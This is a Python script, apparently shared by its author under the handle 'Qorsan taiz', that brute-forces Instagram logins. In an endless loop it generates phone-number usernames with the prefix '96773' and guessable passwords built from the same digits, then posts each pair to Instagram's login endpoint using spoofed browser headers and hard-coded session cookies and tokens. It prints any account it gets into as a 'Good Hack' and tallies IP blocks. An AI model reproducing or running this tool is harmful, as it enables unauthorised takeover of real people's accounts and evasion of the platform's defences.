import requests , random , time
from time import sleep

E = "\033[1;92m"
H = "\033[1;93m"
R = "\033[31;1m"
C = "\033[1;97m"
print(R+'@@@@@@@@@@@@@&#PYJ7!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~!!!!!!!!!!!!!!!!!!!!!!77777777??J5PB#&@@@@@@@@@@@@@')
print('@@@@@@@@@&BY!~^^^^^^^^^^^^^^~~~~~~~~~~~~~~~~~~~!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!7J5B&@@@@@@@@@')
print('@@@@@@@B?^^^^^^^^^^^^^^^~~~~~~~~~~~~~~~~~~~~~!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!7Y#@@@@@@@')
print('@@@@@G!^^^^^^^^^^^^^~~~~~~~~~~~~~~~~~~~~~!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!?B@@@@@')
print('@@@&7^^^^^^^~^~~~~~~~~~~~~~~~~~~~~~~~~!~~!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!J&@@@')
print('@@#~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~!!!!!!!!!!77777777777777777777777!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!7#@@')
print('@&~~~~~~~~~~~~~~~~~~~~~~!7J5GB#&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&#BGPJ?!!!!!!!!!!!!!!!!!!!!!!!#@')
print('@7~~~~~~~~~~~~~~~~~~~7YB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&B5?!!!!!!!!!!!!!!!!!!!?@')
print('B~~~~~~~~~~~~~~!!~!J#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#Y!!!!!!!!!!!!!!!!!!B')
print('J~~~!!!!!!!!!!!!!J&@@@@@@@@@&#BP5555YYYJJJJJJJJJJJJJJYJJJJJJJYYY5555GB#&@@@@@@@@@&Y!!!!!!!!!!!!!!!!Y')
print('?~!!!!!!!!!!!!!!G@@@@@@@&BY7!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!7YG&@@@@@@@B!!!!!!!!!!!!!!!?')
print('7!!!!!!!!!!!!!7#@@@@@@&57!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!7!!!!!75&@@@@@@#!!!!!!!!!!!!!!7')
print('7!!!!!!!!!!7!!B@@@@@@#7!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!JB&&@&G7!!!!#@@@@@@B~!!!!!!!!!!!!7')
print('7!!!!!!!!!!7!J@@@@@@&7!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!5@@@@@@@@?!!!!&@@@@@@J~!!!!!!!!!!!!')
print('7!!!!!!!!!!!!#@@@@@@5!!!!!!!!!!!!!!!!!!!!!!7?Y5PGGGGP5J?7!!!!!!!!G@@@@@@@@J!!!!J@@@@@@B~!!!!!!!!!!!!')
print('!!!!!!!!!!!!7&@@@@@&7!!!!!!!!!!!!!!!!!!7YB&@@@@@@@@@@@@@@&BY7!!!!7G@@@@@&5!!!!!!&@@@@@&!!!!!~!~~~!~!')
print('!!!!!!!!!!!!7@@@@@@&!!!!!!!!!!!!!!!!!Y#@@@@@@@@@@@@@@@@@@@@@@#5!!!!7JYY?!~!!!!!!#@@@@@@7~~~~!~~~~~~!')
print('!!!!!!!!!!!!?@@@@@@#!!!!!!!!!!!!!!!5&@@@@@@@@@@&####&@@@@@@@@@@&5!!!!!!!!!!!!!!~B@@@@@@7~~~~~~~~~~~!')
print('!!!!!!!!!!!!7@@@@@@B~!!!!!!!!!!!!?#@@@@@@@&BY?7!!!~~!7?YG&@@@@@@@&?~!!!!!!!!!!!~G@@@@@@?~~~~~~~~~~~!')
print('!!!!!!!!!!!!7@@@@@@B~!!!!!!!!!!~J@@@@@@@&Y!~~!!!!!!!!!!~~!Y&@@@@@@@J!!!!!!!!!!!~G@@@@@@?~~~~~~~~~~~~')
print('!!!!!!!!!!!!?@@@@@@B~!!!!!!!!!~7@@@@@@@P!~!!!!!!!!!!!!!!!!~!P@@@@@@@7~!!!!!!!!!~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!~?@@@@@@B~!!!!!!!!!~B@@@@@@P~~!!!!!!!!!!!!!!!!!!!~5@@@@@@B~!!!!!~~~~~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!~?@@@@@@B~!!!!!!!!~!@@@@@@&!!!!!!!!!!!!!!!!!!!!!!!~&@@@@@@7~!!!!~~~!~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!~?@@@@@@B~!!!!!!!~!?@@@@@@B~!!!!!!!!!!!!!!!!!!!!!!~#@@@@@@?~~!!!~~!~~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!~?@@@@@@G~!!!!!!!!~!@@@@@@&~~!!!!!!!!!!!!!!!!!!!!~~&@@@@@@7~~~~~~~!~~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!~?@@@@@@B~!!!!!!!!!~B@@@@@@P~!!!!!!!!!!!!!!!!!!!~~5@@@@@@B~~!!!!~~~~~G@@@@@@J~~~~~~~~~~~~')
print('!!!!!!!!!!!!?@@@@@@B!77777777!!7@@@@@@@P!!!!!!!!!!!!!!!!!~~~P@@@@@@@7~~!!!!~~!~~G@@@@@@J~~~~~~~~~~~!')
print('!!!!!!!!!77!?@@@@@@B!77777777777J@@@@@@@&Y7!!!!!!!!!!~~~~!Y&@@@@@@@?~~!!!!!~~!~~G@@@@@@?~~~~~~~~~~~!')
print('!!!777777777?@@@@@@#7???????????7J&@@@@@@@&B5?77!!!!!!?YG&@@@@@@@#7~!!~!!!!!!!~~G@@@@@@?~~~~~~!!!!!!')
print('777777777??7?@@@@@@#???????????????P&@@@@@@@@@@&&##&&&@@@@@@@@@&5~~~~!!!!!!!!!!~B@@@@@@7~~~~~~~!!!!!')
print('7777????????J@@@@@@&?JJJJJJJJJJJJJJ?JP#@@@@@@@@@@@@@@@@@@@@@@#Y!~!!!!!!!!!!!!!~~&@@@@@@7~!!!!!!!!!!!')
print('?????????JJJJ&@@@@@@JJJJJJJJJJJJYYYYYJJYP#&@@@@@@@@@@@@@@&B5?!!!!!!!!!!!!!!!!!~!@@@@@@&!~!!!!!!!!!!!')
print('????JJJJJJJJ?#@@@@@@PJYYYYYYYYYYYYYYYYYYYYYY5PGBBBBBGGPYJ??777777!!!!!!!!!!!!!~J@@@@@@B~~!!!!!!!!!!!')
print('JJJJJJJJJJJYJ5@@@@@@&YYYY55555555555555555555YYYYYYYYJJJJJJJJ????777!!!!!!!!!~!&@@@@@@J~!!!!!!!!!!!7')
print('JJJJJJYYYYYYYY#@@@@@@&5Y5555555PPPPPPPPPP55P55555555555YYYYYJJJJ????777!!!!~~!#@@@@@@B~~!!!!!!!!!!!7')
print('YJYJYYYYYYYYYY5&@@@@@@@BP5PPPPPPPPPPPPPPPPPPPPPPPPP55555555YYYYYJJJ???77!!~!5&@@@@@@#!!!!!!!!!!!!!!7')
print('5YYYYYYY55555555#@@@@@@@@&BGPPPPPPPPPPPPPPPPPPPPPPPPPPP5555555YYYJJJ?????YG&@@@@@@@G!~!!!!!!!!!!!!!?')
print('PYYYY555555555555B&@@@@@@@@@@&&########BBBBBBBBBBBBBBBBBBGGGGGGGGGGBB#&&@@@@@@@@@&J~~!!!!!!!!!!!!!!Y')
print('#YY55555555PPPPPPPPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J!~!!!!!!!!!!!!!!!~G')
print('@P555555PPPPPPPPGGGGGB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#P?!!!!!!!!!!!!!!!!!!!?@')
print('@&5555PPPPPPPPGGGGGGGGGGGB##&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&#GP5J???777!!!!!!!!!!!!!!!!#@')
print('@@&P5PPPPPPGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGPPP555YYYYJJJ??7777!!!!!!!!!!!!!#@@')
print('@@@@BPPPGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGGGGGGPPPP5555YYYJJ??7777!!!!!!!!~~J&@@@')
print('@@@@@&GPGGGGGGBBBBBBBBBBBBBBBBBBBBBBBBBBBBB##BBBBB#BBBBBBBBBBBGGGGGGPPPP555YYYJJ??7777!!!!!~~7B@@@@@')
print('@@@@@@@&#GGGGBBBBBBBBB################################BBBBBBBBBBGGGGGPPPP555YYYJJ??7777!!~!YB@@@@@@@')
print('@@@@@@@@@@&##BBBBBB#######################################BBBBBBBGGGGGPPPP555YYJJ??7777?5B&@@@@@@@@@')
print('@@@@@@@@@@@@@@@&&&&#######################################BBBBBBBGGGGGPPPP55555555PGB#&@@@@@@@@@@@@@')

print('                           by : Qorsan taiz')
print('                     telegram : qorsantaez73')
print('                       github : https://github.com/qorsan73')

b , f , r = 0,0,0
while True:
    time.sleep(0.5)
    N = '1234567890'
    S = ''.join(random.choice(N) for t in range (7))
    Username = '96773' + S
    Password = '73' + S

#Qorsan
#Taiz
    Url = f'https://www.instagram.com/api/v1/web/accounts/login/ajax/?hl=ar'
    Headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '400',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=ZdFAyAALAAFRyAvR4MbqqLBGWEs5; datr=x0DRZRJ7At1TiW_r-cDJQAZ5; ps_n=1; ps_l=1; ig_did=8EF24FA8-00B9-46F7-8941-7B30D960F984; ig_nrcb=1; rur="ODN\05450917553572\0541773427474:01f75637da88a22ccff789967a0cfd1fecf34040c0ecbe0320fe04d3b54e73d96472fa39"; csrftoken=PMsUi85joXNHIRLOESfMZ2xPynMAAnUM; ig_lang=en; wd=315x607',
        'origin': 'https://www.instagram.com',
        'priority': 'u=1, i',
        'referer': 'https://www.instagram.com/?hl=ar',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-full-version-list': '"Chromium";v="134.0.6998.89", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="134.0.6998.89"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-asbd-id': '359341',
        'x-csrftoken': 'PMsUi85joXNHIRLOESfMZ2xPynMAAnUM',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR38cZCzTWMaEl7xXRuXAaDYDm1_lqcr1LogJLvKk6XZPvDw',
        'x-instagram-ajax': '1020866771',
        'x-requested-with': 'XMLHttpRequest',
        'x-web-session-id': 'l6sbp6:43ev8f:d36j3k'
    }
    Data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+Password,
        'caaF2DebugGroup': '0',
        'isPrivacyPortalReq': 'false',
        'loginAttemptSubmissionCount': '1',
        'optIntoOneTap': False,
        'queryParams': '{"hl":"ar"}',
        'trustedDeviceRecords': '{}',
        'username': Username,
        'jazoest': '22717'
        }
    Req = requests.post(Url, headers=Headers, data=Data).text
    if "userId" in Req:
        f += 1
        print(f" {E}Good Hack : {Username}:{Password}") 
    elif "error_type" in Req:
        b +=1
        r +=1
    else:
        r +=1
        print(f'\r [<;] TakeN : {r} ip Block : {b} found : {f} User : {Username} Pass : {Password}',end="")
